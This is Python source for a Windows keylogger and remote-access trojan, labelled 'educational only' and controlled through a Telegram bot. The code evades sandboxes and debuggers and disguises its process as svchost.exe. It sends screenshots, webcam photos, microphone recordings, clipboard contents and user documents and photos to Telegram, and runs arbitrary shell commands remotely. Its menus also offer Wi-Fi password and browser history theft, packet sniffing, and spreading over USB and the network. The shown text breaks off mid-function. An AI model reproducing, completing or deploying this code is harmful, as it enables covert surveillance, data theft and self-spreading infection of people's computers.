# -*- coding: utf-8 -*-
"""
🕵️‍♂️ KEYLOGGER TELEGRAM ULTIMATE - MENÚ COMPLETO
================================================
ADVERTENCIA: SOLO PARA FINES EDUCATIVOS
================================================
"""

import os
import sys
import time
import threading
import requests
import platform
import getpass
import socket
import subprocess
import winreg
import win32event
import win32api
import winerror
import json
import base64
import ctypes
from datetime import datetime, timedelta
from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import psutil

# ===================================================================
# CONFIGURACIÓN
# ===================================================================

TOKEN = ""
CHAT_ID = ""
AES_KEY = os.urandom(32)

SELF_DESTRUCT_DAYS = 7
SEND_INTERVAL = 300
HEARTBEAT_INTERVAL = 1800
SCREENSHOT_INTERVAL = 600
CLIPBOARD_INTERVAL = 30
MIC_INTERVAL = 3600
WEBCAM_INTERVAL = 3600

# ===================================================================
# CIFRADO
# ===================================================================

def encrypt_log(text):
    cipher = AES.new(AES_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

# ===================================================================
# ANTI-SANDBOX Y ANTI-DEBUG
# ===================================================================

def is_sandboxed():
    try:
        if time.time() - psutil.boot_time() < 1800:
            return True
        if psutil.virtual_memory().total < 2 * 1024**3:
            return True
        hostname = socket.gethostname().lower()
        if any(x in hostname for x in ['sandbox', 'virus', 'malware', 'analysis', 'vm']):
            return True
        procs = [p.name().lower() for p in psutil.process_iter()]
        if any(x in ' '.join(procs) for x in ['vbox', 'vmware', 'virtualbox', 'qemu', 'xen']):
            return True
        return False
    except:
        return False

def is_debugged():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        is_debug = ctypes.c_bool()
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(),
            ctypes.byref(is_debug)
        )
        if is_debug.value:
            return True
        dbg_procs = ['x64dbg', 'ollydbg', 'windbg', 'ida', 'gdb']
        for proc in psutil.process_iter(['name']):
            if any(d in proc.info['name'].lower() for d in dbg_procs):
                return True
    except:
        pass
    return False

def disguise_process():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except:
        pass

# ===================================================================
# SINGLE INSTANCE MUTEX
# ===================================================================

mutex_name = "Global\\TelemetryKeyloggerUltimateMutex"
mutex = win32event.CreateMutex(None, False, mutex_name)
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    sys.exit(0)

# ===================================================================
# IMPORTACIONES OPCIONALES
# ===================================================================

try:
    from PIL import ImageGrab
    import io
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

try:
    import win32clipboard
    CLIPBOARD_AVAILABLE = True
except ImportError:
    CLIPBOARD_AVAILABLE = False

try:
    import win32gui
    WINDOW_TITLE_AVAILABLE = True
except ImportError:
    WINDOW_TITLE_AVAILABLE = False

try:
    import pyaudio
    import wave
    MIC_AVAILABLE = True
except ImportError:
    MIC_AVAILABLE = False

try:
    import browser_cookie3
    BROWSER_COOKIE_AVAILABLE = True
except ImportError:
    BROWSER_COOKIE_AVAILABLE = False

try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False

try:
    import wmi
    WMI_AVAILABLE = True
except ImportError:
    WMI_AVAILABLE = False

try:
    import scapy.all as scapy
    SNIFFER_AVAILABLE = True
except ImportError:
    SNIFFER_AVAILABLE = False

try:
    from win32com.client import Dispatch
    SHORTCUT_AVAILABLE = True
except ImportError:
    SHORTCUT_AVAILABLE = False

try:
    import cv2
    import numpy as np
    import pyautogui
    SCREEN_REC_AVAILABLE = True
except ImportError:
    SCREEN_REC_AVAILABLE = False

# ===================================================================
# CLASE PRINCIPAL
# ===================================================================

class UltimateKeylogger:
    def __init__(self):
        # --- Configuración ---
        self.TELEGRAM_TOKEN = TOKEN
        self.TELEGRAM_CHAT_ID = CHAT_ID
        self.SEND_THRESHOLD = 100
        self.SEND_INTERVAL = SEND_INTERVAL
        self.HEARTBEAT_INTERVAL = HEARTBEAT_INTERVAL
        self.SELF_DESTRUCT_DAYS = SELF_DESTRUCT_DAYS

        self.key_buffer = []
        self.last_sent = datetime.now()
        self.running = True
        self.shift_pressed = False
        self.ctrl_pressed = False
        self.alt_pressed = False
        self.streaming_mode = False
        self.streaming_target = None

        self.stats = {
            'keys_pressed': 0,
            'messages_sent': 0,
            'start_time': datetime.now(),
            'files_exfiltrated': 0,
            'usb_propagated': 0
        }

        if "--silent" in sys.argv:
            self.hide_console()
        disguise_process()

        if is_sandboxed() or is_debugged():
            sys.exit(0)

        self.system_info = self.get_system_info()
        self.send_startup_message()

        self.timer_thread = threading.Thread(target=self.timer_loop, daemon=True)
        self.timer_thread.start()

        self.last_window_title = ""
        self.last_clipboard_content = ""
        self.sniffer_running = False
        self.sniffer_packets = []
        self.command_check_interval = 10

        # Hilos de módulos silenciosos
        if SCREENSHOT_AVAILABLE:
            threading.Thread(target=self._screenshot_loop, daemon=True).start()
        if CLIPBOARD_AVAILABLE:
            threading.Thread(target=self._clipboard_loop, daemon=True).start()
        if WINDOW_TITLE_AVAILABLE:
            threading.Thread(target=self._window_title_loop, daemon=True).start()
        if MIC_AVAILABLE:
            threading.Thread(target=self._mic_loop, daemon=True).start()
        if WEBCAM_AVAILABLE:
            threading.Thread(target=self._webcam_loop, daemon=True).start()
        if SCREEN_REC_AVAILABLE:
            threading.Thread(target=self._screen_recording_loop, daemon=True).start()
        threading.Thread(target=self._remote_commands_loop, daemon=True).start()
        threading.Thread(target=self._file_exfiltration_loop, daemon=True).start()
        threading.Thread(target=self._browser_history_loop, daemon=True).start()
        threading.Thread(target=self._usb_propagation_loop, daemon=True).start()
        threading.Thread(target=self._wifi_loop, daemon=True).start()
        threading.Thread(target=self._network_propagation_loop, daemon=True).start()
        threading.Thread(target=self._self_destruct_timer, daemon=True).start()

        if "--silent" not in sys.argv:
            print(f"[✓] Keylogger Ultimate iniciado en {self.system_info['hostname']}")

    # ===================================================================
    # MÉTODOS PRINCIPALES
    # ===================================================================

    def hide_console(self):
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def get_system_info(self):
        info = {
            'hostname': socket.gethostname(),
            'user': getpass.getuser(),
            'os': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine(),
            'local_ip': socket.gethostbyname(socket.gethostname()),
            'public_ip': self.get_public_ip()
        }
        return info

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            return "No disponible"

    # ===================================================================
    # ENVÍO A TELEGRAM CON FORMATO Y BOTONES
    # ===================================================================

    def send_to_telegram(self, text, retry=2, parse_mode=None, reply_markup=None):
        for intento in range(retry + 1):
            try:
                url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendMessage"
                data = {
                    "chat_id": self.TELEGRAM_CHAT_ID,
                    "text": text[:4000],
                    "parse_mode": parse_mode
                }
                if reply_markup:
                    data["reply_markup"] = json.dumps(reply_markup)
                response = requests.post(url, data=data, timeout=10)
                if response.status_code == 200:
                    self.stats['messages_sent'] += 1
                    return True
                else:
                    time.sleep(2)
            except:
                time.sleep(2)
        return False

    def _send_inline_keyboard(self, chat_id, text, keyboard, parse_mode="Markdown"):
        url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "reply_markup": json.dumps({"inline_keyboard": keyboard})
        }
        try:
            requests.post(url, data=data, timeout=10)
        except:
            pass

    def _send_main_menu(self, chat_id):
        keyboard = [
            [{"text": "Capturar", "callback_data": "btn_screenshot"},
             {"text": "Webcam", "callback_data": "btn_webcam"}],
            [{"text": "Grabar Pantalla", "callback_data": "btn_recscreen_menu"},
             {"text": "Portapapeles", "callback_data": "btn_clipboard"}],
            [{"text": "Microfono", "callback_data": "btn_mic"},
             {"text": "Archivos", "callback_data": "btn_files_menu"}],
            [{"text": "Fotos", "callback_data": "btn_photos_menu"},
             {"text": "Documentos", "callback_data": "btn_docs_menu"}],
            [{"text": "Ver Archivos", "callback_data": "btn_view_files"}],
            [{"text": "Credenciales", "callback_data": "btn_wifi"},
             {"text": "Historial", "callback_data": "btn_history"}],
            [{"text": "Sniffer", "callback_data": "btn_sniffer_menu"},
             {"text": "Comandos", "callback_data": "btn_cmd_menu"}],
            [{"text": "Estado", "callback_data": "btn_info"},
             {"text": "USB", "callback_data": "btn_propagate"}],
            [{"text": "Red", "callback_data": "btn_netprop"},
             {"text": "Desinstalar", "callback_data": "btn_uninstall"}],
            [{"text": "Ayuda", "callback_data": "btn_help"}]
        ]
        self._send_inline_keyboard(chat_id, " Menu Principal - Keylogger Ultimate", keyboard)

    def _send_formatted_message(self, chat_id, title, content):
        """Envía un mensaje con formato de recuadro negro (bloque de código)"""
        msg = f"""╔═══════════════════════════════════════╗
                  ║ {title.center(37)} ║
                  ╠═══════════════════════════════════════╣
                  {content}
                  ╚═══════════════════════════════════════╝
"""
        self.send_to_telegram(msg, parse_mode="Markdown")

    # ===================================================================
    # MENÚ DE GRABACIÓN DE PANTALLA (submenú con duraciones)
    # ===================================================================

    def _send_recscreen_menu(self, chat_id):
        keyboard = [
            [{"text": "15 segundos", "callback_data": "btn_recscreen_15"},
             {"text": "30 segundos", "callback_data": "btn_recscreen_30"}],
            [{"text": "60 segundos", "callback_data": "btn_recscreen_60"},
             {"text": "120 segundos", "callback_data": "btn_recscreen_120"}],
            [{"text": "300 segundos", "callback_data": "btn_recscreen_300"}],
            [{"text": "Volver", "callback_data": "btn_back"}]
        ]
        self._send_inline_keyboard(chat_id, "Selecciona la duracion de la grabacion:", keyboard)

    # ===================================================================
    # MENÚ DE ARCHIVOS (tipos)
    # ===================================================================

    def _send_files_menu(self, chat_id):
        keyboard = [
            [{"text": "Documentos", "callback_data": "btn_files_docs"},
             {"text": "Imagenes", "callback_data": "btn_files_images"}],
            [{"text": "Musica", "callback_data": "btn_files_music"},
             {"text": "Videos", "callback_data": "btn_files_videos"}],
            [{"text": "Comprimidos", "callback_data": "btn_files_zips"},
             {"text": "Ejecutables", "callback_data": "btn_files_exe"}],
            [{"text": "Todos", "callback_data": "btn_files_all"}],
            [{"text": "Volver", "callback_data": "btn_back"}]
        ]
        self._send_inline_keyboard(chat_id, "Selecciona tipo de archivo a exfiltrar:", keyboard)

    def _cmd_files_by_type(self, chat_id, ext_list, label):
        self.send_to_telegram(f"Buscando {label}...")
        files_found = []
        for root, _, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if any(file.lower().endswith(ext) for ext in ext_list):
                    files_found.append(os.path.join(root, file))
                    if len(files_found) >= 5:
                        break
            if len(files_found) >= 5:
                break
        if not files_found:
            self.send_to_telegram(f"No se encontraron {label}")
            return
        for fpath in files_found:
            try:
                with open(fpath, 'rb') as f:
                    url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendDocument"
                    files = {'document': (os.path.basename(fpath), f)}
                    data = {'chat_id': chat_id}
                    requests.post(url, data=data, files=files, timeout=30)
                time.sleep(1)
            except:
                continue
        self.send_to_telegram(f"Enviados {len(files_found)} {label}")

    # ===================================================================
    # MENÚ DE FOTOS (cantidad)
    # ===================================================================

    def _send_photos_menu(self, chat_id):
        keyboard = [
            [{"text": "5 fotos", "callback_data": "btn_photos_5"},
             {"text": "10 fotos", "callback_data": "btn_photos_10"}],
            [{"text": "20 fotos", "callback_data": "btn_photos_20"},
             {"text": "50 fotos", "callback_data": "btn_photos_50"}],
            [{"text": "Todas (max 100)", "callback_data": "btn_photos_all"}],
            [{"text": "Volver", "callback_data": "btn_back"}]
        ]
        self._send_inline_keyboard(chat_id, "Cuantas fotos quieres extraer?", keyboard)

    def _cmd_photos_by_count(self, chat_id, count):
        self.send_to_telegram(f"Buscando {count} fotos...")
        photo_exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff']
        photos = []
        for root, _, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if any(file.lower().endswith(ext) for ext in photo_exts):
                    photos.append(os.path.join(root, file))
                    if len(photos) >= count:
                        break
            if len(photos) >= count:
                break
        if not photos:
            self.send_to_telegram("No se encontraron fotos")
            return
        for fpath in photos:
            try:
                with open(fpath, 'rb') as f:
                    url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendPhoto"
                    files = {'photo': (os.path.basename(fpath), f)}
                    data = {'chat_id': chat_id}
                    requests.post(url, data=data, files=files, timeout=30)
                time.sleep(1)
            except:
                continue
        self.send_to_telegram(f"Enviadas {len(photos)} fotos")

    # ===================================================================
    # MENÚ DE DOCUMENTOS (tipos)
    # ===================================================================

    def _send_docs_menu(self, chat_id):
        keyboard = [
            [{"text": "Word (.docx)", "callback_data": "btn_docs_word"},
             {"text": "Excel (.xlsx)", "callback_data": "btn_docs_excel"}],
            [{"text": "PDF (.pdf)", "callback_data": "btn_docs_pdf"},
             {"text": "PowerPoint (.pptx)", "callback_data": "btn_docs_ppt"}],
            [{"text": "Texto (.txt)", "callback_data": "btn_docs_txt"},
             {"text": "Todos", "callback_data": "btn_docs_all"}],
            [{"text": "Volver", "callback_data": "btn_back"}]
        ]
        self._send_inline_keyboard(chat_id, "Selecciona tipo de documento:", keyboard)

    def _cmd_docs_by_type(self, chat_id, ext_list, label):
        self.send_to_telegram(f"Buscando {label}...")
        docs = []
        for root, _, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if any(file.lower().endswith(ext) for ext in ext_list):
                    docs.append(os.path.join(root, file))
                    if len(docs) >= 10:
                        break
            if len(docs) >= 10:
                break
        if not docs:
            self.send_to_telegram(f"No se encontraron {label}")
            return
        for fpath in docs:
            try:
                with open(fpath, 'rb') as f:
                    url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendDocument"
                    files = {'document': (os.path.basename(fpath), f)}
                    data = {'chat_id': chat_id}
                    requests.post(url, data=data, files=files, timeout=30)
                time.sleep(1)
            except:
                continue
        self.send_to_telegram(f"Enviados {len(docs)} {label}")

    # ===================================================================
    # MENÚ DE VER ARCHIVOS (carpetas)
    # ===================================================================

    def _send_view_files_menu(self, chat_id):
        keyboard = [
            [{"text": "Escritorio", "callback_data": "btn_view_desktop"},
             {"text": "Descargas", "callback_data": "btn_view_downloads"}],
            [{"text": "Documentos", "callback_data": "btn_view_documents"},
             {"text": "Imagenes", "callback_data": "btn_view_pictures"}],
            [{"text": "Musica", "callback_data": "btn_view_music"},
             {"text": "Videos", "callback_data": "btn_view_videos"}],
            [{"text": "C:\\", "callback_data": "btn_view_c"},
             {"text": "Personalizado", "callback_data": "btn_view_custom"}],
            [{"text": "Volver", "callback_data": "btn_back"}]
        ]
        self._send_inline_keyboard(chat_id, "Selecciona la carpeta a listar:", keyboard)

    def _cmd_view_folder(self, chat_id, folder_path):
        if not os.path.exists(folder_path):
            self.send_to_telegram(f"La carpeta no existe: {folder_path}")
            return
        try:
            items = os.listdir(folder_path)
            if not items:
                self.send_to_telegram(f"Carpeta vacia: {folder_path}")
                return
            files_list = []
            for item in items[:20]:
                item_path = os.path.join(folder_path, item)
                if os.path.isdir(item_path):
                    files_list.append(f"[DIR] {item}")
                else:
                    size = os.path.getsize(item_path)
                    size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.1f} MB"
                    files_list.append(f"[FILE] {item} ({size_str})")
            content = "\n".join(files_list)
            self._send_formatted_message(chat_id, f"Contenido de {folder_path}", content)
        except Exception as e:
            self.send_to_telegram(f"Error al listar: {str(e)[:200]}")

    def _cmd_view_custom(self, chat_id):
        self.send_to_telegram("Envia la ruta de la carpeta a listar con: /view <ruta>")

    # ===================================================================
    # MENÚ DE COMANDOS
    # ===================================================================

    def _send_cmd_menu(self, chat_id):
        keyboard = [
            [{"text": "ipconfig", "callback_data": "cmd_ipconfig"},
             {"text": "systeminfo", "callback_data": "cmd_systeminfo"}],
            [{"text": "tasklist", "callback_data": "cmd_tasklist"},
             {"text": "netstat -ano", "callback_data": "cmd_netstat"}],
            [{"text": "whoami", "callback_data": "cmd_whoami"},
             {"text": "dir C:\\", "callback_data": "cmd_dir_c"}],
            [{"text": "Comando personalizado", "callback_data": "cmd_custom"}],
            [{"text": "Volver", "callback_data": "btn_back"}]
        ]
        self._send_inline_keyboard(chat_id, "Selecciona un comando:", keyboard)

    # ===================================================================
    # MENÚ DE SNIFFER
    # ===================================================================

    def _send_sniffer_menu(self, chat_id):
        keyboard = [
            [{"text": "30s", "callback_data": "btn_sniff_30"},
             {"text": "60s", "callback_data": "btn_sniff_60"}],
            [{"text": "120s", "callback_data": "btn_sniff_120"},
             {"text": "300s", "callback_data": "btn_sniff_300"}],
            [{"text": "Detener", "callback_data": "btn_stopsniff"}],
            [{"text": "Volver", "callback_data": "btn_back"}]
        ]
        self._send_inline_keyboard(chat_id, "Captura de trafico:", keyboard)

    # ===================================================================
    # MANEJO DE CALLBACKS
    # ===================================================================

    def _handle_command(self, command, chat_id, callback_query_id=None):
        if command.startswith('btn_') or command.startswith('cmd_'):
            if callback_query_id:
                self._answer_callback(callback_query_id)
            self._handle_button_click(command, chat_id)
            return

        if command.startswith('/start'):
            self._send_main_menu(chat_id)
            return

        if command.startswith('/cmd '):
            cmd = command[5:]
            self._cmd_execute(chat_id, cmd)
            return

        if command.startswith('/view '):
            path = command[6:]
            self._cmd_view_folder(chat_id, path)
            return

        if command.startswith('/sniff'):
            parts = command.split()
            duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 30
            self._cmd_sniffer_start(chat_id, duration)
            return

        if command == '/stopsniff':
            self._cmd_sniffer_stop(chat_id)
            return

        if command == '/info':
            self._cmd_info(chat_id)
            return

        if command == '/help':
            self._cmd_help(chat_id)
            return

        if command == '/uninstall':
            self._cmd_uninstall(chat_id)
            return

        self._send_main_menu(chat_id)

    def _handle_button_click(self, data, chat_id):
        # === MENÚ PRINCIPAL ===
        if data == "btn_screenshot":
            self._cmd_screenshot(chat_id)
        elif data == "btn_webcam":
            self._cmd_webcam(chat_id)
        elif data == "btn_recscreen_menu":
            self._send_recscreen_menu(chat_id)
        elif data.startswith("btn_recscreen_"):
            duration = int(data.split("_")[2])
            self._cmd_recscreen(chat_id, duration)
        elif data == "btn_clipboard":
            self._cmd_clipboard(chat_id)
        elif data == "btn_mic":
            self._cmd_mic(chat_id)
        elif data == "btn_files_menu":
            self._send_files_menu(chat_id)
        elif data == "btn_files_docs":
            self._cmd_files_by_type(chat_id, ['.docx', '.doc', '.txt', '.rtf', '.odt'], "documentos")
        elif data == "btn_files_images":
            self._cmd_files_by_type(chat_id, ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff'], "imagenes")
        elif data == "btn_files_music":
            self._cmd_files_by_type(chat_id, ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma'], "archivos de musica")
        elif data == "btn_files_videos":
            self._cmd_files_by_type(chat_id, ['.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv'], "videos")
        elif data == "btn_files_zips":
            self._cmd_files_by_type(chat_id, ['.zip', '.rar', '.7z', '.tar', '.gz'], "comprimidos")
        elif data == "btn_files_exe":
            self._cmd_files_by_type(chat_id, ['.exe', '.msi', '.bat', '.cmd', '.ps1'], "ejecutables")
        elif data == "btn_files_all":
            self._cmd_files_by_type(chat_id, ['.docx', '.doc', '.pdf', '.xlsx', '.txt', '.jpg', '.png', '.zip', '.rar', '.mp3', '.mp4'], "archivos")

        # === FOTOS ===
        elif data == "btn_photos_menu":
            self._send_photos_menu(chat_id)
        elif data.startswith("btn_photos_"):
            count_str = data.split("_")[2]
            count = 100 if count_str == "all" else int(count_str)
            self._cmd_photos_by_count(chat_id, count)

        # === DOCUMENTOS ===
        elif data == "btn_docs_menu":
            self._send_docs_menu(chat_id)
        elif data == "btn_docs_word":
            self._cmd_docs_by_type(chat_id, ['.docx', '.doc'], "documentos Word")
        elif data == "btn_docs_excel":
            self._cmd_docs_by_type(chat_id, ['.xlsx', '.xls'], "documentos Excel")
        elif data == "btn_docs_pdf":
            self._cmd_docs_by_type(chat_id, ['.pdf'], "PDFs")
        elif data == "btn_docs_ppt":
            self._cmd_docs_by_type(chat_id, ['.pptx', '.ppt'], "presentaciones PowerPoint")
        elif data == "btn_docs_txt":
            self._cmd_docs_by_type(chat_id, ['.txt', '.rtf'], "archivos de texto")
        elif data == "btn_docs_all":
            self._cmd_docs_by_type(chat_id, ['.docx', '.doc', '.pdf', '.xlsx', '.xls', '.pptx', '.ppt', '.txt', '.rtf'], "documentos")

        # === VER ARCHIVOS ===
        elif data == "btn_view_files":
            self._send_view_files_menu(chat_id)
        elif data == "btn_view_desktop":
            self._cmd_view_folder(chat_id, os.path.join(os.path.expanduser('~'), 'Desktop'))
        elif data == "btn_view_downloads":
            self._cmd_view_folder(chat_id, os.path.join(os.path.expanduser('~'), 'Downloads'))
        elif data == "btn_view_documents":
            self._cmd_view_folder(chat_id, os.path.join(os.path.expanduser('~'), 'Documents'))
        elif data == "btn_view_pictures":
            self._cmd_view_folder(chat_id, os.path.join(os.path.expanduser('~'), 'Pictures'))
        elif data == "btn_view_music":
            self._cmd_view_folder(chat_id, os.path.join(os.path.expanduser('~'), 'Music'))
        elif data == "btn_view_videos":
            self._cmd_view_folder(chat_id, os.path.join(os.path.expanduser('~'), 'Videos'))
        elif data == "btn_view_c":
            self._cmd_view_folder(chat_id, "C:\\")
        elif data == "btn_view_custom":
            self._cmd_view_custom(chat_id)

        # === COMANDOS ===
        elif data == "btn_cmd_menu":
            self._send_cmd_menu(chat_id)
        elif data == "cmd_ipconfig":
            self._cmd_execute(chat_id, "ipconfig /all")
        elif data == "cmd_systeminfo":
            self._cmd_execute(chat_id, "systeminfo")
        elif data == "cmd_tasklist":
            self._cmd_execute(chat_id, "tasklist")
        elif data == "cmd_netstat":
            self._cmd_execute(chat_id, "netstat -ano")
        elif data == "cmd_whoami":
            self._cmd_execute(chat_id, "whoami")
        elif data == "cmd_dir_c":
            self._cmd_execute(chat_id, "dir C:\\")
        elif data == "cmd_custom":
            self.send_to_telegram("Escribe el comando con: /cmd <comando>")

        # === SNIFFER ===
        elif data == "btn_sniffer_menu":
            self._send_sniffer_menu(chat_id)
        elif data.startswith("btn_sniff_"):
            duration = int(data.split("_")[2])
            self._cmd_sniffer_start(chat_id, duration)
        elif data == "btn_stopsniff":
            self._cmd_sniffer_stop(chat_id)

        # === OTRAS ACCIONES ===
        elif data == "btn_wifi":
            self._cmd_wifi(chat_id)
        elif data == "btn_history":
            self._cmd_history(chat_id)
        elif data == "btn_info":
            self._cmd_info(chat_id)
        elif data == "btn_propagate":
            self._cmd_propagate(chat_id)
        elif data == "btn_netprop":
            self._cmd_netprop(chat_id)
        elif data == "btn_uninstall":
            self._cmd_uninstall(chat_id)
        elif data == "btn_help":
            self._cmd_help(chat_id)
        elif data == "btn_back":
            self._send_main_menu(chat_id)

    def _answer_callback(self, callback_query_id, text="Comando ejecutado"):
        url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/answerCallbackQuery"
        data = {"callback_query_id": callback_query_id, "text": text}
        try:
            requests.post(url, data=data, timeout=10)
        except:
            pass

    # ===================================================================
    # COMANDOS DE ACCIÓN
    # ===================================================================

    def _cmd_screenshot(self, chat_id):
        if not SCREENSHOT_AVAILABLE:
            self.send_to_telegram("Modulo de captura no disponible")
            return
        try:
            screenshot = ImageGrab.grab()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=70)
            img_bytes.seek(0)
            url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': ('screenshot.jpg', img_bytes)}
            data = {'chat_id': chat_id}
            requests.post(url, data=data, files=files, timeout=15)
        except Exception as e:
            self.send_to_telegram(f"Error: {str(e)[:100]}")

    def _cmd_webcam(self, chat_id):
        if not WEBCAM_AVAILABLE:
            self.send_to_telegram("Camara no disponible")
            return
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame)
                img_bytes = img_encoded.tobytes()
                url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendPhoto"
                files = {'photo': ('webcam.jpg', img_bytes)}
                data = {'chat_id': chat_id}
                requests.post(url, data=data, files=files, timeout=15)
            cap.release()
        except Exception as e:
            self.send_to_telegram(f"Error: {str(e)[:100]}")

    def _cmd_recscreen(self, chat_id, duration=30):
        if not SCREEN_REC_AVAILABLE:
            self.send_to_telegram("Modulo de grabacion no instalado. Instala: pip install pyautogui")
            return
        self.send_to_telegram(f"Grabando {duration} segundos de pantalla...")
        threading.Thread(target=self._record_screen, args=(duration, 10, chat_id), daemon=True).start()

    def _cmd_clipboard(self, chat_id):
        if not CLIPBOARD_AVAILABLE:
            self.send_to_telegram("Portapapeles no disponible")
            return
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                text = data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else str(data)
                self.send_to_telegram(f"Contenido del portapapeles:\n```\n{text[:1000]}\n```", parse_mode="Markdown")
            else:
                self.send_to_telegram("Portapapeles vacio o no textual")
            win32clipboard.CloseClipboard()
        except Exception as e:
            self.send_to_telegram(f"Error: {str(e)[:100]}")

    def _cmd_mic(self, chat_id):
        if not MIC_AVAILABLE:
            self.send_to_telegram("Microfono no disponible")
            return
        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=16000,
                                input=True, frames_per_buffer=1024)
            frames = [stream.read(1024) for _ in range(0, int(16000 / 1024 * 5))]
            stream.stop_stream()
            stream.close()
            audio.terminate()
            wav_bytes = io.BytesIO()
            wf = wave.open(wav_bytes, 'wb')
            wf.setnchannels(1)
            wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
            wf.setframerate(16000)
            wf.writeframes(b''.join(frames))
            wf.close()
            wav_bytes.seek(0)
            url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendAudio"
            files = {'audio': ('recording.wav', wav_bytes)}
            data = {'chat_id': chat_id}
            requests.post(url, data=data, files=files, timeout=20)
        except Exception as e:
            self.send_to_telegram(f"Error: {str(e)[:100]}")

    def _cmd_wifi(self, chat_id):
        self._steal_wifi_passwords()

    def _cmd_history(self, chat_id):
        self._steal_browser_history()

    def _cmd_sniffer_start(self, chat_id, duration):
        self._start_sniffer(duration, chat_id)

    def _cmd_sniffer_stop(self, chat_id):
        self._stop_sniffer(chat_id)

    def _cmd_info(self, chat_id):
        uptime = datetime.now() - self.stats['start_time']
        info = f"""
ESTADO DEL KEYLOGGER
Equipo: {self.system_info['hostname']} | Usuario: {self.system_info['user']}
Activo: {str(uptime).split('.')[0]}
Teclas: {self.stats['keys_pressed']}
Mensajes: {self.stats['messages_sent']}
Sniffer: {'Activo' if self.sniffer_running else 'Inactivo'}
Archivos exfiltrados: {self.stats.get('files_exfiltrated', 0)}
USB propagado: {self.stats.get('usb_propagated', 0)}
"""
        self.send_to_telegram(info, parse_mode="Markdown")

    def _cmd_execute(self, chat_id, cmd):
        try:
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30,
                                    creationflags=subprocess.CREATE_NO_WINDOW)
            result = output.stdout + output.stderr
            if len(result) > 4000:
                self._send_file(chat_id, "output.txt", result)
            else:
                self.send_to_telegram(f"Comando: `{cmd}`\n```\n{result}\n```", parse_mode="Markdown")
        except Exception as e:
            self.send_to_telegram(f"Error: {str(e)[:200]}")

    def _cmd_propagate(self, chat_id):
        drives = self._get_removable_drives()
        if drives:
            for d in drives:
                self._copy_self_to_usb(d)
            self.send_to_telegram(f"Propagado a {len(drives)} USB(s)")
        else:
            self.send_to_telegram("No se detectaron USBs")

    def _cmd_netprop(self, chat_id):
        self._scan_and_propagate_network()

    def _cmd_uninstall(self, chat_id):
        self.send_to_telegram("Auto-destruccion iniciada...")
        self._self_destruct()

    def _cmd_help(self, chat_id):
        help_text = """
AYUDA - COMANDOS Y BOTONES

Botones principales:
- Capturar: toma captura de pantalla
- Webcam: toma foto con la camara
- Grabar Pantalla: elige duracion
- Portapapeles: muestra el contenido del portapapeles
- Microfono: graba audio
- Archivos: exfiltra archivos por tipo
- Fotos: extrae fotos (5, 10, 20, 50, todas)
- Documentos: extrae documentos por tipo
- Ver Archivos: lista archivos de carpetas
- Credenciales: extrae contraseñas WiFi
- Historial: extrae historial de navegacion
- Sniffer: captura trafico de red (elige duracion)
- Comandos: ejecuta comandos del sistema
- Estado: muestra informacion del keylogger
- USB: propaga keylogger por USB
- Red: propaga por red local
- Desinstalar: auto-destruccion

Comandos de texto:
/cmd <comando> - ejecuta comando
/sniff <segundos> - sniffer
/stopsniff - detener sniffer
/view <ruta> - lista archivos de carpeta
/info - estado
/help - ayuda
/uninstall - auto-destruccion
"""
        self.send_to_telegram(help_text, parse_mode="Markdown")

    def _send_file(self, chat_id, filename, content):
        try:
            from io import BytesIO
            bio = BytesIO(content.encode('utf-8'))
            url = f"https://api.telegram.org/bot{self.TELEGRAM_TOKEN}/sendDocument"
            files = {'document': (filename, bio)}
            data = {'chat_id': chat_id}
            requests.post(url, data=data, files=files, timeout=30)
        except:
            pass

    # ===================================================================
    # GRABACIÓN DE PANTALLA
    # ===================================================================

    def _record_screen(self, duration=30, fps=10, chat_id=None):
        if not SCREEN_REC_AVAILABLE:
            return
        if chat_id is None:
            chat_id = self.TELEGRAM_CHAT_ID
        try:
